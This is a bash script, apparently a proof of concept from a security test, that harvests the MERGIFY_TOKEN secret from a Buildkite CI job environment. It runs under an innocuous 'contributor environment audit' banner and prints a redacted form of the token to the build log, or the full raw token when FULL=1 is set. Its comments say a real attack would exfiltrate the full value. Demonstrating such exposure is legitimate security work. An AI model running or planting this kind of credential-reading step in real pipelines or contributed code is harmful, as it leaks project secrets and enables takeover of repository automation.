#!/usr/bin/env bash
# HARVEST PROOF — reads MERGIFY_TOKEN from the JOB environment (inherited from the
# agent env per buildkite.md:125) and displays it. PROOF-OF-READ ONLY.
#
# Default output is REDACTED (first-4/last-4 + length + sha256) so build logs remain
# safe to paste into reports. FULL=1 prints the raw token — operator's explicit choice
# at GO time (the realistic attack would exfiltrate the full value; we only ever need
# to demonstrate the read, and the operator holds the original in keys/ anyway).
set -euo pipefail

echo "== contributor environment audit =="
echo "host: $(hostname) user: $(whoami) ts: $(date -u +%FT%TZ)"

if [ -z "${MERGIFY_TOKEN:-}" ]; then
  echo "MERGIFY_TOKEN: ABSENT in job env"
  exit 0
fi

LEN=${#MERGIFY_TOKEN}
FIRST4=${MERGIFY_TOKEN:0:4}
LAST4=${MERGIFY_TOKEN: -4}
SHA=$(printf %s "$MERGIFY_TOKEN" | sha256sum | cut -d' ' -f1)

echo "MERGIFY_TOKEN: PRESENT in job env"
echo "MERGIFY_TOKEN redacted: ${FIRST4}...${LAST4} (len=${LEN})"
echo "MERGIFY_TOKEN sha256: ${SHA}"

if [ "${FULL:-0}" = "1" ]; then
  echo "MERGIFY_TOKEN full: ${MERGIFY_TOKEN}"
fi
